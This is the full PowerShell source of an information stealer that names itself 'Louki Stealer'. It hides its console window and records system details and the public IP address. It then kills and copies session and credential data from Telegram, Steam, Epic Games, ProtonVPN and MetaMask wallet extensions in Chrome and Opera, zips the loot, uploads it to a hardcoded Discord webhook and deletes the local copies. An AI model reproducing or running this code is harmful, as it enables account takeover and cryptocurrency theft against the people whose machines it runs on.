$ErrorActionPreference = 'silentlycontinue'
$pcname = $env:COMPUTERNAME
$RandomNumber = Get-Random


# Louki Stealer Config
$webhookUrl = "https://discord.com/api/webhooks/1341125316357128254/E7IVbkT_8x945vyeYe_gOWRmDPdonAiQku7OqpOuk-ZaTpET7_KhT-pC5I_LUEEWV43G" # Only Discord Webhooks available atm

$telegramvr = "true"
$epicvr = "true"
$protonvr = "true"
$metavr = "true"
$steamvr = "true"

$DATE = Get-Date -Format "MM/dd/yyyy"
$DATE2 = Get-Date -Format "MM-dd-yyyy"

$IP = Invoke-WebRequest -Uri "http://ip-api.com/json/?fields=8194" -UseBasicParsing
$IP = $IP.Content | ConvertFrom-Json
$CR = $IP.countryCode
$IP = $IP.query

$main = "$env:LOCALAPPDATA\$CR`_$pcname($DATE2)$RandomNumber"
$sessions = "$env:LOCALAPPDATA\$CR`_$pcname($DATE2)$RandomNumber\Sessions"
$crypto = "$env:LOCALAPPDATA\$CR`_$pcname($DATE2)$RandomNumber\Sessions\Crypto"

$loukiBanner = "CiQkXCAgICAgICAgICAgICAgICAgICAgICQkXCAgICAgICAkJFwgICQkJCQkJFwgJCQkJCQkJCRcICQkXCAgICAgICAkJCQkJCQkXCAgCiQkIHwgICAgICAgICAgICAgICAgICAgICQkIHwgICAgICBcX198JCQgIF9fJCRcXF9fJCQgIF9ffCQkIHwgICAgICAkJCAgX18kJFwgCiQkIHwgJCQkJCQkXCAgJCRcICAgJCRcICQkIHwgICQkXCAkJFwgJCQgLyAgXF9ffCAgJCQgfCAgICQkIHwgICAgICAkJCB8ICAkJCB8CiQkIHwkJCAgX18kJFwgJCQgfCAgJCQgfCQkIHwgJCQgIHwkJCB8XCQkJCQkJFwgICAgJCQgfCAgICQkIHwgICAgICAkJCQkJCQkICB8CiQkIHwkJCAvICAkJCB8JCQgfCAgJCQgfCQkJCQkJCAgLyAkJCB8IFxfX19fJCRcICAgJCQgfCAgICQkIHwgICAgICAkJCAgX18kJDwgCiQkIHwkJCB8ICAkJCB8JCQgfCAgJCQgfCQkICBfJCQ8ICAkJCB8JCRcICAgJCQgfCAgJCQgfCAgICQkIHwgICAgICAkJCB8ICAkJCB8CiQkIHxcJCQkJCQkICB8XCQkJCQkJCAgfCQkIHwgXCQkXCAkJCB8XCQkJCQkJCAgfCAgJCQgfCAgICQkJCQkJCQkXCAkJCB8ICAkJCB8ClxfX3wgXF9fX19fXy8gIFxfX19fX18vIFxfX3wgIFxfX3xcX198IFxfX19fX18vICAgXF9ffCAgIFxfX19fX19fX3xcX198ICBcX198CmRldiB2ZXJzaW9uLCBtYWRlIGJ5IGdpdGh1Yi5jb20vZG94ZGsgKGxvdWtpc3RsciB2MSk="
$dcstrings = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($loukiBanner))
$loukiSTLR = "$dcstrings`nLog Name : $pcname`nLog Date : $DATE`n"

New-Item -ItemType Directory -Path $main -Force
New-Item -ItemType Directory -Path $sessions -Force

$steam = "Not Found"
$telegram = "Not Found"
$epicgames = "Not Found"
$proton = "Not Found"
$metamask = "Not Found"

function hide-me {
    if (-not ("Console.Window" -as [type])) { 
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        '
    }
    $consoler = [Console.Window]::GetConsoleWindow()
    $null = [Console.Window]::ShowWindow($consoler, 0)
}

function pcInfo() {
    $OS = (Get-WmiObject -class Win32_OperatingSystem).Caption
    $UUID = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
    $CPU = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
    $GPU = (Get-WmiObject Win32_VideoController).Name 
    $RAM = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}    
    $info = "$loukiSTLR`n========================================================`n`nOS  : $OS`n`nUUID : $UUID`n`nCPU : $CPU`n`nGPU : $GPU`n`nRAM : $RAM`n`n========================================================"
    $info > $main\System.txt
}

function networkInfo() {
    $MAC = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
    $info = "$loukiSTLR`n========================================================`n`nIP  : $IP`n`nMAC : $MAC`n`n========================================================"
    $info > $main\Network.txt
}

function getepic {
    $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
    if (!(Test-Path $epicgamesfolder)) {return}
    $processname = "epicgameslauncher"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $epicgames_session = "$env:temp\Louki-EpicGames"
    New-Item -ItemType Directory -Force -Path $epicgames_session
    Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
    Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
    Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
    Compress-Archive -Path $epicgames_session -DestinationPath "$sessions\EpicGames.zip" -CompressionLevel Fastest -Force
    Remove-Item $epicgames_session -Recurse -Force
}

function getproton {
    $protonvpnfolder = "$env:localappdata\protonvpn"
    if (!(Test-Path $protonvpnfolder)) {return}
    $processname = "protonvpn"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $protonvpn_account = "$env:temp\Louki-ProtonVPN"
    New-Item -ItemType Directory -Force -Path $protonvpn_account
    $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
    $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
    $files = Get-ChildItem -Path $protonvpnfolder -File | Where-Object { $_.Name -match $pattern }
    foreach ($directory in $directories) {
        $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $directory.Name
        Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
    }
    foreach ($file in $files) {
        $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $file.Name
        Copy-Item -Path $file.FullName -Destination $destinationPath -Force
    }
    Copy-Item -Path "$protonvpnfolder\Startup.profile" -Destination $protonvpn_account -Recurse -force
    Compress-Archive -Path $protonvpn_account -DestinationPath "$sessions\ProtonVPN.zip" -CompressionLevel Fastest -Force
    Remove-Item $protonvpn_account -Recurse -Force
}

function gettelegram {
    $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
    if (!(Test-Path $path)) {return}
    $processname = "telegram"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $destination = "$sessions\Telegram.zip"
    $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
    $files = Get-ChildItem -Path $path -Exclude $exclude
    Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest -Force
}

function getmetamask {
    $paths = @{
        "OperaGX" = "$env:APPDATA\Opera Software\Opera GX Stable\Local Extension Settings\"
        "Opera" = "$env:APPDATA\Opera Software\Opera Stable\Local Extension Settings\"
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local Extension Settings\"
        "Chrome1" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Local Extension Settings\"
        "Chrome2" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 2\Local Extension Settings\"
        "Chrome3" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 3\Local Extension Settings\"
    }
    
    $extpath = @{
        "Meta" = "nkbihfbeogaeaoehlefnkodbefgpgknn"
    }
    
    foreach ($pathKey in $paths.Keys) {
        $pathValue = $paths[$pathKey]
    
        foreach ($extKey in $extpath.Keys) {
            $extValue = $extpath[$extKey]
            $sessiontemp = "$env:temp\$pathKey-MetaMask"
            $newPath = "$pathValue$extValue"
            if (Test-Path -Path $newPath -PathType Container) {
                New-Item -ItemType Directory -Path $crypto -Force
                Copy-Item -Path $newPath -Destination $sessiontemp -Recurse -force
                Compress-Archive -Path $sessiontemp -DestinationPath "$crypto\$pathKey-MetaMask" -CompressionLevel Fastest -Force
                Remove-Item $sessiontemp -Recurse -Force
            }
        }
    }    
}

function getsteam {
    $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
    if (!(Test-Path $steamfolder)) {return}
    $processname = "steam"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $steam_session = "$env:TEMP\Louki-Steam"
    New-Item -ItemType Directory -Force -Path $steam_session
    Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
    $ssfnfiles = @("ssfn$1")
    foreach($file in $ssfnfiles) {
        Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $steam_session }
    }
    Compress-Archive -Path $steam_session -DestinationPath "$sessions\Steam.zip" -CompressionLevel Fastest -Force
    Remove-Item $steam_session -Recurse -Force
}

function startlouki {
    hide-me
    pcInfo
    networkInfo
    if ($telegramvr -eq "true") {
        gettelegram
    }
    if ($steamvr -eq "true") {
        getsteam
    }
    if ($epicvr -eq "true") {
        getepic
    }
    if ($protonvr -eq "true") {
        getproton
    }
    if ($metavr -eq "true") {
        getmetamask
    }
}

startlouki

if (!(Test-Path "$sessions\Telegram.zip")) {} else {
    $telegram = "Found"
}
if (!(Test-Path "$sessions\Steam.zip")) {} else {
    $steam = "Found"
}
if (!(Test-Path "$sessions\ProtonVPN.zip")) {} else {
    $proton = "Found"
}
if (!(Test-Path "$sessions\EpicGames.zip")) {} else {
    $epicgames = "Found"
}
if (!(Test-Path "$crypto")) {} else {
    $metamask = "Found"
}
$sessionscontent = "$loukiSTLR`n========================================================`n`nTelegram  : $telegram`n`nSteam : $steam`n`nMetaMask : $metamask`n`nProtonVPN : $proton`n`nEpic Games : $epicgames`n`n========================================================"
$sessionscontent > "$main\Sessions.txt"

Compress-Archive -Path $main -DestinationPath "$main.zip" -CompressionLevel Fastest -Force
Remove-Item $main -Recurse -Force

$mainpath = "$main.zip"

# Enviar el archivo a Discord
$boundary = [System.Guid]::NewGuid().ToString()
$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

$bodyLines = @(
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"$($mainpath.Split('\')[-1])`"",
    "Content-Type: application/zip",
    "",
    [System.IO.File]::ReadAllText($mainpath),
    "--$boundary--"
)

$body = $bodyLines -join "`r`n"

Invoke-WebRequest -Uri $webhookUrl -Method Post -Headers $headers -Body $body

Remove-Item "$main.zip" -Recurse -Force